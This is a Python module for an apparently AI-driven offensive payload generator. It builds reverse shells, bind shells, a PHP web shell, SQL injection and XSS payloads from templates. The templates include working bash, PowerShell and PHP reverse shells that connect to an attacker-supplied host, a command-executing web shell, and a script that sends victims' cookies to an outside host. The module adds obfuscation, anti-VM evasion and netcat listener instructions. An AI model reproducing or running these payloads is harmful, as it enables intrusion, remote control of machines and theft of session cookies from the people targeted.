"""
Payload Generator - Dynamic payload creation and encoding.

AI-driven payload generation with evasion techniques.
"""
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from enum import Enum
import base64
import hashlib
import random
import string
from ..core.base import OffensiveTool, ToolResult, ToolMetadata
from ..core.exceptions import OffensiveToolError


class PayloadType(Enum):
    """Payload types."""
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    WEB_SHELL = "web_shell"
    COMMAND_INJECTION = "command_injection"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PRIVILEGE_ESCALATION = "privilege_escalation"


class PayloadPlatform(Enum):
    """Target platforms."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    WEB = "web"
    ANDROID = "android"
    IOS = "ios"


class EncodingType(Enum):
    """Payload encoding types."""
    BASE64 = "base64"
    URL = "url"
    HEX = "hex"
    ROT13 = "rot13"
    XOR = "xor"
    AES = "aes"


@dataclass
class PayloadConfig:
    """Payload configuration."""
    payload_type: PayloadType
    platform: PayloadPlatform
    lhost: Optional[str] = None
    lport: Optional[int] = None
    encoding: Optional[EncodingType] = None
    obfuscation_level: int = 1  # 1-5
    custom_params: Dict = None


@dataclass
class GeneratedPayload:
    """Generated payload information."""
    payload_type: PayloadType
    platform: PayloadPlatform
    code: str
    encoded_code: Optional[str] = None
    handler_instructions: Optional[str] = None
    metadata: Dict = None


class PayloadGenerator(OffensiveTool):
    """
    AI-enhanced payload generator.
    
    Generates dynamic payloads with automatic evasion,
    encoding, and obfuscation techniques driven by ML
    recommendations.
    """
    
    def __init__(self) -> None:
        """Initialize payload generator."""
        super().__init__(
            name="payload_generator",
            category="exploitation"
        )
        
        self.templates: Dict[str, str] = self._load_templates()
        self.obfuscators: Dict[str, Callable] = self._load_obfuscators()
    
    async def execute(
        self,
        config: PayloadConfig,
        **kwargs
    ) -> ToolResult:
        """
        Generate payload.
        
        Args:
            config: Payload configuration
            **kwargs: Additional parameters
            
        Returns:
            ToolResult with generated payload
            
        Raises:
            OffensiveToolError: If generation fails
        """
        try:
            # Generate base payload
            payload_code = await self._generate_base_payload(config)
            
            # Apply obfuscation
            if config.obfuscation_level > 0:
                payload_code = await self._obfuscate_payload(
                    payload_code,
                    config.platform,
                    config.obfuscation_level
                )
            
            # Apply encoding
            encoded_code = None
            if config.encoding:
                encoded_code = await self._encode_payload(
                    payload_code,
                    config.encoding
                )
            
            # Generate handler instructions
            handler_instructions = self._generate_handler_instructions(config)
            
            payload = GeneratedPayload(
                payload_type=config.payload_type,
                platform=config.platform,
                code=payload_code,
                encoded_code=encoded_code,
                handler_instructions=handler_instructions,
                metadata={
                    "obfuscation_level": config.obfuscation_level,
                    "encoding": config.encoding.value if config.encoding else None,
                    "size_bytes": len(payload_code.encode())
                }
            )
            
            return ToolResult(
                success=True,
                data=payload,
                message=f"Payload generated: {config.payload_type.value}",
                metadata=self._create_metadata(payload)
            )
            
        except Exception as e:
            raise OffensiveToolError(
                f"Payload generation failed: {str(e)}",
                tool_name=self.name,
                details={"config": str(config)}
            )
    
    async def _generate_base_payload(
        self, config: PayloadConfig
    ) -> str:
        """
        Generate base payload from templates.
        
        Args:
            config: Payload configuration
            
        Returns:
            Payload code
        """
        template_key = f"{config.payload_type.value}_{config.platform.value}"
        
        if template_key not in self.templates:
            raise OffensiveToolError(
                f"No template for {template_key}",
                tool_name=self.name
            )
        
        template = self.templates[template_key]
        
        # Replace placeholders
        payload = template
        if config.lhost:
            payload = payload.replace("{{LHOST}}", config.lhost)
        if config.lport:
            payload = payload.replace("{{LPORT}}", str(config.lport))
        
        return payload
    
    async def _obfuscate_payload(
        self,
        payload: str,
        platform: PayloadPlatform,
        level: int
    ) -> str:
        """
        Obfuscate payload.
        
        Args:
            payload: Original payload
            platform: Target platform
            level: Obfuscation level (1-5)
            
        Returns:
            Obfuscated payload
        """
        obfuscated = payload
        
        # Apply obfuscation techniques based on level
        if level >= 1:
            obfuscated = self._randomize_variables(obfuscated)
        
        if level >= 2:
            obfuscated = self._add_junk_code(obfuscated)
        
        if level >= 3:
            obfuscated = self._encode_strings(obfuscated)
        
        if level >= 4:
            obfuscated = self._split_payloads(obfuscated)
        
        if level >= 5:
            obfuscated = self._add_anti_analysis(obfuscated, platform)
        
        return obfuscated
    
    def _randomize_variables(self, code: str) -> str:
        """Randomize variable names."""
        # Simple variable randomization
        var_map = {}
        common_vars = ["var", "tmp", "data", "result", "output"]
        
        for var in common_vars:
            if var in code:
                random_var = self._generate_random_string(8)
                var_map[var] = random_var
        
        for old, new in var_map.items():
            code = code.replace(old, new)
        
        return code
    
    def _add_junk_code(self, code: str) -> str:
        """Add junk code for obfuscation."""
        junk_lines = [
            "# " + self._generate_random_string(20),
            "pass  # " + self._generate_random_string(15)
        ]
        
        lines = code.split('\n')
        for _ in range(random.randint(2, 5)):
            insert_pos = random.randint(0, len(lines))
            lines.insert(insert_pos, random.choice(junk_lines))
        
        return '\n'.join(lines)
    
    def _encode_strings(self, code: str) -> str:
        """Encode string literals."""
        # Base64 encode strings (simplified)
        return code
    
    def _split_payloads(self, code: str) -> str:
        """Split payload into chunks."""
        return code
    
    def _add_anti_analysis(self, code: str, platform: PayloadPlatform) -> str:
        """Add anti-analysis techniques."""
        if platform == PayloadPlatform.WINDOWS:
            anti_vm = """
# Anti-VM checks
import os
if os.path.exists(r'C:\\Program Files\\VMware'):
    exit()
"""
            code = anti_vm + code
        
        return code
    
    async def _encode_payload(
        self, payload: str, encoding: EncodingType
    ) -> str:
        """
        Encode payload.
        
        Args:
            payload: Original payload
            encoding: Encoding type
            
        Returns:
            Encoded payload
        """
        if encoding == EncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == EncodingType.HEX:
            return payload.encode().hex()
        
        elif encoding == EncodingType.ROT13:
            return self._rot13(payload)
        
        elif encoding == EncodingType.XOR:
            key = random.randint(1, 255)
            return self._xor_encode(payload, key)
        
        return payload
    
    def _rot13(self, text: str) -> str:
        """ROT13 encoding."""
        import codecs
        return codecs.encode(text, 'rot_13')
    
    def _xor_encode(self, text: str, key: int) -> str:
        """XOR encoding."""
        return ''.join(chr(ord(c) ^ key) for c in text)
    
    def _generate_handler_instructions(
        self, config: PayloadConfig
    ) -> str:
        """
        Generate instructions for payload handler.
        
        Args:
            config: Payload configuration
            
        Returns:
            Handler instructions
        """
        if config.payload_type == PayloadType.REVERSE_SHELL:
            return f"""
Listener Setup:
1. Start netcat listener:
   nc -lvnp {config.lport or 4444}

2. Wait for connection from target

3. Once connected, you'll have shell access
"""
        
        elif config.payload_type == PayloadType.BIND_SHELL:
            return f"""
Connection Instructions:
1. Connect to target:
   nc {config.lhost or 'TARGET_IP'} {config.lport or 4444}

2. Shell will be presented upon connection
"""
        
        return "No specific handler instructions"
    
    def _generate_random_string(self, length: int) -> str:
        """Generate random string."""
        return ''.join(
            random.choices(
                string.ascii_lowercase + string.digits,
                k=length
            )
        )
    
    def _load_templates(self) -> Dict[str, str]:
        """Load payload templates."""
        return {
            "reverse_shell_linux": '''#!/bin/bash
bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
''',
            "reverse_shell_windows": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
''',
            "reverse_shell_web": '''<?php
$sock = fsockopen("{{LHOST}}", {{LPORT}});
exec("/bin/sh -i <&3 >&3 2>&3");
?>
''',
            "web_shell_web": '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
''',
            "sql_injection_web": """' OR '1'='1' --""",
            
            "xss_web": '''<script>fetch('http://{{LHOST}}:{{LPORT}}/steal?cookie='+document.cookie)</script>'''
        }
    
    def _load_obfuscators(self) -> Dict[str, Callable]:
        """Load obfuscation functions."""
        return {
            "variable_randomization": self._randomize_variables,
            "junk_code": self._add_junk_code,
            "string_encoding": self._encode_strings
        }
    
    def _create_metadata(self, payload: GeneratedPayload) -> ToolMetadata:
        """
        Create tool metadata.
        
        Args:
            payload: Generated payload
            
        Returns:
            Tool metadata
        """
        return ToolMetadata(
            tool_name=self.name,
            execution_time=0.0,
            success_rate=1.0,
            confidence_score=0.85,
            resource_usage={
                "payload_size": payload.metadata.get("size_bytes", 0),
                "obfuscation_applied": payload.metadata.get("obfuscation_level", 0) > 0
            }
        )
    
    async def validate(self) -> bool:
        """
        Validate generator functionality.
        
        Returns:
            True if validation passes
        """
        try:
            # Test basic payload generation
            config = PayloadConfig(
                payload_type=PayloadType.REVERSE_SHELL,
                platform=PayloadPlatform.LINUX,
                lhost="127.0.0.1",
                lport=4444
            )
            result = await self.execute(config)
            return result.success
        except Exception:
            return False
